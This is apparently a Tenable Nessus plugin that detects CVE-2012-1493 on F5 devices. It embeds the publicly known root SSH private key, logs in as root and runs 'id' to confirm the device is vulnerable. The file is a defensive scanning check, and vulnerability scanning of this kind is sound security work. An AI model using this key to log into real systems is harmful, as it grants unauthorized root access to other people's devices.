#TRUSTED a0724d9be70323406c983ceb0d3299fa935d649be0de7e99a2414c90644909a1fefb571275562f8a3001c511b898105168ad805151a86b6dc1bc9a85b15920351b40724a9a8056609b80c25267de4a12db5e21ceb074b00dfbc45e3d1fc8116c1749dbb2a51f69d23e39485a9e4a6c8944c845b1dfe757d5fab586225f6de7bf7d4a4e8753aca08df88c8eb3c0b29634c0c6f1f4f5deed72725ff074ce6e352283186098e491833decfc9aa9eabe6053cb7b8f478b4b78b8191db4293b503b1f776497526c0cac0c65e33618e3e53c04e2c9b8783bf08eddd16ac4b677f416813244c2acfc1ed0347c83d73e4186fadd1a3d9279861b700b4f12171767432e42e37889654e06968d22aa76d5e5b1181069bcf8bf5a2a1fda7e5f8c17f5bcb2facfd37feb4393ef6598db9928e8c642198c0fdfacf5fcc845735ba00efb4f1724fe19936ab41220a1fd6707d33e7a307f7fc4cdde2c706e36057000a0ea694d8ef53ab5a0ce9867c066656b7aea697b55fee966e057af5dbda52b33b1e337e9fbe65e588b891872ba3447417a73e5db40be9fc1e102052b4cb4043d7797ce740858a2b23f87277371c7c1993e71ffa19b51325de8516516985c897f1591d6b56b3a7523ddeac3aaac4ef57e4cabbf61df44d7defe1d746b5b299032427960e913e92b4501c7e28521c05f92397786eaef4a48d361ffba1b30c9860a66ca9fe28f
#TRUST-RSA-SHA256 2b2b1463633589031f959b9b2a568361170aad421fd18d72aa6d510be1836ed7dc35849f99b245f7cd3c36c3485dabe787b61b4559ebf8a816e345099df61ab44119531ac72745ddd1cb348952e5ecb097223776698123206e71f5e1ad2cb0da8bf78c93d7b1d4b3f1e1afca490ecc9ce6d2639d66bf4ba6dcb844186656175a61213efd1afb8616d6762ea16ea097b23ef90c94aabc15a98c36e278aa9ee427de4b1a5a5633cab563899c5428d15778f7cf1d888269a73df63298a211a075ef5bb50bc03192c90cf922c3379abc8f42237239267249966cf20e9dc87cf8efb9108df4c1cddc90ffe8adb6bc0689da9ef43bae0dafa9b7215ba8d2cc35c728e8ae52c4167da16028c0fc69607b747a42c4889d3532cf9c7f6add97c3aa824790430d143f64d8ad5a19526a80226f449630d80365cb2dbb6cd4ed680b1fd07ecbce354cfbbf5f39a0b78a3cce82523c2401cda0f418c93e2dd7c36abf69f8a9f7c6b4661bb24732fd60931806dc686187d083e20fe042f738e6c8b78a1aa4a633462fe21f0ea3f23d3d5f5aaee73e9583a919846f3059eca849136c77b3021c89fa7457f4f7ee984c9c765104e2a1059d35857a6816760c42319be5505ea6c15274544f5db2074bd9e098b1826be57d99eb07a9149aad2e542f26036254c9763a7d7c05bbb9544fe78fdbcaaebf80100cc96f43bcc2989355fef362f11d7cec0a
#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59477);
  script_version("1.21");
  script_set_attribute(attribute:"plugin_modification_date", value:"2024/07/24");

  script_cve_id("CVE-2012-1493");
  script_bugtraq_id(53897);
  script_xref(name:"EDB-ID", value:"19064");
  script_xref(name:"EDB-ID", value:"19091");

  script_name(english:"F5 Multiple Products Root Authentication Bypass");
  script_summary(english:"Checks if a given public key is valid for root");

  script_set_attribute(attribute:"synopsis", value:
"The remote host has an authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote F5 device has an authentication bypass vulnerability.  The
SSH private key for the root user is publicly known.  A remote,
unauthenticated attacker could exploit this to login as root.");
  script_set_attribute(attribute:"see_also", value:"https://www.trustmatta.com/advisories/MATTA-2012-002.txt");
  script_set_attribute(attribute:"see_also", value:"https://support.f5.com/csp/article/K13600");
  script_set_attribute(attribute:"solution", value:
"Apply the relevant fix referenced by F5 advisory SOL13600.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2012-1493");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'F5 BIG-IP SSH Private Key Exposure');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/06/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/06/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/06/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2012-2024 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("ssh_detect.nasl");
  script_exclude_keys("global_settings/supplied_logins_only");
  script_require_ports("Services/ssh", 22);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("ssh_lib.inc");
include("data_protection.inc");

checking_default_account_dont_report = TRUE;

enable_ssh_wrappers();
if (supplied_logins_only) audit(AUDIT_SUPPLIED_LOGINS_ONLY);

user = 'root';
private_key ='-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgQC8iELmyRPPHIeJ//uLLfKHG4rr84HXeGM+quySiCRgWtxbw4rh
UlP7n4XHvB3ixAKdWfys2pqHD/Hqx9w4wMj9e+fjIpTi3xOdh/YylRWvid3Pf0vk
OzWftKLWbay5Q3FZsq/nwjz40yGW3YhOtpK5NTQ0bKZY5zz4s2L4wdd0uQIBIwKB
gBWL6mOEsc6G6uszMrDSDRbBUbSQ26OYuuKXMPrNuwOynNdJjDcCGDoDmkK2adDF
8auVQXLXJ5poOOeh0AZ8br2vnk3hZd9mnF+uyDB3PO/tqpXOrpzSyuITy5LJZBBv
7r7kqhyBs0vuSdL/D+i1DHYf0nv2Ps4aspoBVumuQid7AkEA+tD3RDashPmoQJvM
2oWS7PO6ljUVXszuhHdUOaFtx60ZOg0OVwnh+NBbbszGpsOwwEE+OqrKMTZjYg3s
37+x/wJBAMBtwmoi05hBsA4Cvac66T1Vdhie8qf5dwL2PdHfu6hbOifSX/xSPnVL
RTbwU9+h/t6BOYdWA0xr0cWcjy1U6UcCQQDBfKF9w8bqPO+CTE2SoY6ZiNHEVNX4
rLf/ycShfIfjLcMA5YAXQiNZisow5xznC/1hHGM0kmF2a8kCf8VcJio5AkBi9p5/
uiOtY5xe+hhkofRLbce05AfEGeVvPM9V/gi8+7eCMa209xjOm70yMnRHIBys8gBU
Ot0f/O+KM0JR0+WvAkAskPvTXevY5wkp5mYXMBlUqEd7R3vGBV/qp4BldW5l0N4G
LesWvIh6+moTbFuPRoQnGO2P6D7Q5sPPqgqyefZS
-----END RSA PRIVATE KEY-----';
public_key = 'AAAAB3NzaC1yc2EAAAABIwAAAIEAvIhC5skTzxyHif/7iy3yhxuK6/OB13hjPqrskogkYFrcW8OK4VJT+5+Fx7wd4sQCnVn8rNqahw/x6sfcOMDI/Xvn4yKU4t8TnYf2MpUVr4ndz39L5Ds1n7Si1m2suUNxWbKv58I8+NMhlt2ITraSuTU0NGymWOc8+LNi+MHXdLk=';

port = sshlib::kb_ssh_transport();
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port);

_ssh_socket = open_sock_tcp(port);
if (!_ssh_socket) audit(AUDIT_SOCK_FAIL, port);

ret = ssh_login(login:user, pub:public_key, priv:private_key);
if (ret != 0) audit(AUDIT_HOST_NOT, 'affected');

output = ssh_cmd(cmd:'id', nosh:TRUE, nosudo:TRUE);
ssh_close_connection();

if (!output || "uid=" >!< output) audit(AUDIT_RESP_BAD, port, "an 'id' command");

if (report_verbosity > 0)
{
  report =
    '\nNessus authenticated via SSH using the following private key :\n\n' +
    private_key + '\n\n' +
    'After authenticating Nessus executed the "id" command which returned :\n\n' +
    data_protection::sanitize_uid(output:chomp(output)) + '\n';
  security_hole(port:port, extra:report);
}
else security_hole(port);

